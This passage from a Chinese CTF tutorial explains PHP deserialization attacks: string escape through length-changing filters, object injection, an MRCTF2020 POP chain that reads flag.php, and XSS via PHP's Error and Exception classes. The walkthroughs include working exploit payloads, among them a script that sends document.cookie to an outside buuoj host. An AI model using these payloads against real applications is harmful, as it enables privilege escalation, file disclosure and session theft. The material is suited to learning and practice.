<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;此时，age=<span class="hljs-subst">$new</span>[1]"</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>正常输出如下</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230311145523517.png" alt="image-20230311145523517"></p>
<p>添加一个x看看：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230311145625392.png" alt="image-20230311145625392"></p>
<p>这个就是将GET传入的name中的 x 改为了 xx，正常传入不含x的name值就会正常显示</p>
<p>例如：?name=mao，此时长度为3<br>
如果我们传入maox，正常情况下他的长度就是4，但是经过change函数的替换，变成了abcxx，导致溢出（长度大于4）进而影响下面的反序列化<br>
我们可以利用这一点来实现字符串逃逸</p>
<p>构造：</p>
<pre><code class="hljs scss">?name=abcxxxxxxxxxxxxxxxxxxxx";<span class="hljs-selector-tag">i</span>:<span class="hljs-number">1</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"whoami"</span>;}</code></pre>
<p><strong>输出如下：</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230311150147558.png" alt="image-20230311150147558"></p>
<p>解释：</p>
<p>当我们构造name时，在abc后写18个x，而且后面 ";i:1;s:4:“flag”;} 也是18的长度；在进行change时，这里的18个x就变成了36个x，刚好符合序列化时的长度，从而造成 ";i:1;s:4:“flag”;} 溢出，前面的"闭合前串，后面的;}闭合反序列化的全过程，而先前存在的$age被舍弃（因为这里数组只有两个元素），不影响反序列化的过程</p>
<p><strong>总之，age变量被我们控制</strong></p>
<p><strong>2.过滤后字符变少(把反序列化后的两个x替换成为一个)</strong></p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">change</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">"xx"</span>,<span class="hljs-string">"x"</span>,<span class="hljs-variable">$str</span>);
}
<span class="hljs-variable">$arr</span>[<span class="hljs-string">'name'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
<span class="hljs-variable">$arr</span>[<span class="hljs-string">'age'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'age'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-string">"反序列化字符串："</span>;
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"过滤后:"</span>;
<span class="hljs-variable">$old</span> = <span class="hljs-title function_ invoke__">change</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$arr</span>));
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$old</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;"</span>;
<span class="hljs-variable">$new</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$old</span>);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$new</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br/&gt;此时，age="</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$new</span>[<span class="hljs-string">'age'</span>];</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230727165639082.png" alt="image-20230727165639082"></p>
<p>构造：</p>
<pre><code class="hljs plaintext">?name=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&amp;age=11";s:3:"age";s:6:"whoami";}</code></pre>
<p>这里的40个x经过滤后就变为了20个x，但是在前面的长度还是40，所以后面的20个字符被”吃掉“</p>
<p>注意 <strong>";s:3:“age”;s:28:</strong> 这一部分本来就有，后面的 <strong>;s:3:“age”;s:6:“whoami”;}</strong> 为我们所构造的<br>
age被我们控制</p>
<p><strong>ctfshow web262</strong></p>
<p>脚本：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">message</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$from</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$msg</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$to</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$token</span>=<span class="hljs-string">'user'</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$f</span>,<span class="hljs-variable">$m</span>,<span class="hljs-variable">$t</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-keyword">from</span> = <span class="hljs-variable">$f</span>;
        <span class="hljs-variable language_">$this</span>-&gt;msg = <span class="hljs-variable">$m</span>;
        <span class="hljs-variable language_">$this</span>-&gt;to = <span class="hljs-variable">$t</span>;
    }
}

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$msg</span></span>)</span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'fuck'</span>, <span class="hljs-string">'loveU'</span>, <span class="hljs-variable">$msg</span>);
}

<span class="hljs-variable">$msg</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">message</span>(<span class="hljs-string">'fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}'</span>,<span class="hljs-string">'b'</span>,<span class="hljs-string">'c'</span>);

<span class="hljs-variable">$msg_1</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$msg</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_1</span>;


<span class="hljs-variable">$msg_2</span> =<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$msg_1</span>);

<span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg_2</span>;

<span class="hljs-comment">//O:7:"message":4:{s:4:"from";s:310:"loveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveUloveU";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:5:"admin";}";s:3:"msg";s:1:"b";s:2:"to";s:1:"c";s:5:"token";s:4:"user";}</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<h2 id="0x08-对象注入">0x08 对象注入</h2>
<p>对象注入<br>
当用户的请求在传给反序列化函数 unserialize() 之前没有被正确的过滤时就会产生漏洞。因为PHP允<br>
许对象序列化，攻击者就可以提交特定的序列化的字符串给一个具有该漏洞的 unserialize 函数，最终<br>
导致一个在该应用范围内的任意PHP对象注入。<br>
<strong>前提需要满足两个条件</strong></p>
<pre><code class="hljs plaintext">1、unserialize的参数可控。
2、代码里有定义一个含有魔术方法的类，并且该方法里出现一些使用类成员变量作为参数的存在安全问题的函
数。</code></pre>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
<span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">"12345"</span>;
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
<span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;
}
}
<span class="hljs-variable">$a</span> = <span class="hljs-string">'O:1:"A":1:{s:4:"test";s:5:"23456";}'</span>;
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>脚本结束时会调用**__destruct()函数**，同时会覆盖test变量输出 23456</p>
<h2 id="0x09-pop链简单介绍">0x09 POP链简单介绍</h2>
<p>前面所讲解的序列化攻击更多的是魔术方法中出现一些利用的漏洞，因为自动调用而触发漏洞，但如果关键代码不在魔术方法中，而是在一个类的普通方法中。这时候可以通过寻找相同的函数名将类的属性和敏感函数的属性联系起来</p>
<p><strong>简单案例MRCTF2020-Ezpop</strong></p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
    
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>{
        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">//当尝试将对象调用为函数时触发</span>
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);
    }
}
<span class="hljs-variable">$a</span> <span class="hljs-variable">$b</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">'index.php'</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'Welcome to '</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">"&lt;br&gt;"</span>;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{ <span class="hljs-comment">//把类当作字符串使用时触发</span>
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="hljs-variable">$this</span>-&gt;source))
    {
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"hacker"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">"index.php"</span>;
    	}
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{ <span class="hljs-comment">//当调用一个不存在的或者是无法访问的属性的时候被调用</span>
        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;
        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();
    }
}
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){
    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;
    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p>共有3个类，反序列化会调用__wakeup，存在于Show类__wake中的$this-&gt;source可控，也就是Show中$source变量可控</p>
<p>思路：将$source构造成一个对象Show，当$source为一个对象时。就会执行Show类中的__toString<br>
此时将$str指向Test类<br>
$this-&gt;str-&gt;source：取str类中的source值，使这个值自动调用__get<br>
此时将$p构造成new Modifier<br>
return $function() 表示将function当作函数返回<br>
当类变量直接当作函数调用的时候，就会调用魔术方法__invoke<br>
然后将$var构造成读取源码即可</p>
<pre><code class="hljs plaintext">$var = 'php://filter/read=convert.base64-encode/recource=flag.php';</code></pre>
<p>payload：</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'memory_limit'</span>,<span class="hljs-string">'-1'</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>{
    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$var</span> = <span class="hljs-string">'php://filter/read=convert.base64-</span>
<span class="hljs-string">encode/resource=flag.php'</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;
        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();
}
}
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-string">'aaa'</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p>来自：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/av4142669">https://www.bilibili.com/video/av4142669</a></p>
<h2 id="0x10-php原生类反序列化利用">0x10 PHP原生类反序列化利用</h2>
<p>我们可以使用以下方法遍历一下PHP的内置类：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$classes</span> = <span class="hljs-title function_ invoke__">get_declared_classes</span>();   <span class="hljs-comment">//返回由已定义类的名字所组成的数组</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$classes</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$class</span>) {
    <span class="hljs-variable">$methods</span> = <span class="hljs-title function_ invoke__">get_class_methods</span>(<span class="hljs-variable">$class</span>);  <span class="hljs-comment">//返回由类的方法名组成的数组</span>
    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$methods</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$method</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$method</span>, <span class="hljs-keyword">array</span>(
            <span class="hljs-string">'__destruct'</span>,
            <span class="hljs-string">'__toString'</span>,
            <span class="hljs-string">'__wakeup'</span>,
            <span class="hljs-string">'__call'</span>,
            <span class="hljs-string">'__callStatic'</span>,
            <span class="hljs-string">'__get'</span>,
            <span class="hljs-string">'__set'</span>,
            <span class="hljs-string">'__isset'</span>,
            <span class="hljs-string">'__unset'</span>,
            <span class="hljs-string">'__invoke'</span>,
            <span class="hljs-string">'__set_state'</span>    // 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
        ))) {
            <span class="hljs-keyword">print</span> <span class="hljs-variable">$class</span> . <span class="hljs-string">'::'</span> . <span class="hljs-variable">$method</span> . <span class="hljs-string">"\n"</span>;
        }
    }
}</code></pre>
<pre><code class="hljs php"><span class="hljs-title class_">Exception</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">Exception</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ErrorException</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ErrorException</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">Error</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">Error</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">CompileError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">CompileError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ParseError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ParseError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">TypeError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">TypeError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ArgumentCountError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ArgumentCountError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ArithmeticError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ArithmeticError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">DivisionByZeroError</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">DivisionByZeroError</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">ClosedGeneratorException</span>::<span class="hljs-variable constant_">__wakeup</span>
<span class="hljs-title class_">ClosedGeneratorException</span>::<span class="hljs-variable constant_">__toString</span>
<span class="hljs-title class_">DateTime</span>::<span class="hljs-variable constant_">__wakeup</span>
......</code></pre>
<p>其中常遇到的几个 PHP 原生类有：</p>
<ul>
<li>Error</li>
<li>Exception</li>
<li>SoapClient</li>
<li>DirectoryIterator</li>
<li>SimpleXMLElement</li>
<li>SplFileObject</li>
</ul>
<h3 id="101-errorexception-内置类进行-xss">10.1 Error/Exception 内置类进行 XSS</h3>
<h4 id="error-内置类">Error 内置类</h4>
<ul>
<li>适用于php7版本</li>
<li>在开启报错的情况下</li>
</ul>
<p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，其实我看到的还是有好一些cms会选择直接使用 <code>echo &lt;Object&gt;</code> 的写法，我们都知道当把对象当成字符串的时候它就会自动调用这个方法，而它会将<code>Error</code>以字符串的形式表达出来；那么假如有一个<code>echo</code>将它输出出来，而输出内容如果是我们可以控制的，那我们就可以用<code>&lt;script&gt;</code>标签来执行js代码了</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>]);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<p>（这里可以看到是一个反序列化函数，但是没有让我们进行反序列化的类啊，这就遇到了一个反序列化但没有POP链的情况，所以只能找到PHP内置类来进行反序列化）</p>
<p>POC:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">// 输出：O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624192846524.png" alt="image-20230624192846524"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624193738145.png" alt="image-20230624193738145"></p>
<pre><code class="hljs plaintext">&lt;script&gt;标签直接被嵌入了进去，那里面的内容自然就会被当成js代码执行咯</code></pre>
<p>Exception类和Error类类似，用法原理都差不多，这里就不赘述了，只不过Exception类无论是在php5还是php7<strong>的环境下都能使用</strong></p>
<h4 id="exception-内置类">Exception 内置类</h4>
<ul>
<li>适用于php5、7版本</li>
<li>开启报错的情况下</li>
</ul>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'whoami'</span>]);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$b</span>);  
<span class="hljs-meta">?&gt;</span>
<span class="hljs-comment">// 输出：O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A26%3A%22%2Fvar%2Fwww%2Fhtml%2Ftmp%2Ftest.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230624194213912.png" alt="image-20230624194213912"></p>
<p><strong>[BJDCTF 2nd]xss之光</strong></p>
<p>不知道为何BUU里面这道题没了，只好看着别人的说一次。</p>
<p>进入题目，首先通过git泄露拿到源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'yds_is_so_beautiful'</span>];
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);</code></pre>
<p>仅看到一个反序列化函数并没有给出需要反序列化的类，这就遇到了一个反序列化但没有POP链的情况，所以只能找PHP内置类来进行反序列化。又发现有个echo，没得跑了，就是我们刚才演示的利用Error或Exception内置类进行XSS，但是查看一下题目的环境发现是PHP 5，所以我们要使用Exception类。</p>
<p>由于此题是xss，所以只要xss执行window.open()就能把flag带出来，所以POC如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$poc</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">"&lt;script&gt;window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);&lt;/script&gt;"</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>));
<span class="hljs-meta">?&gt;</span>
 
<span class="hljs-comment">// 输出O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></code></pre>
<p>执行后，得到flag就在 cookie 中。</p>
<h3 id="102-errorexception-内置类绕过哈希比较">10.2 Error/Exception 内置类绕过哈希比较</h3>
<h4 id="error-类">Error 类</h4>
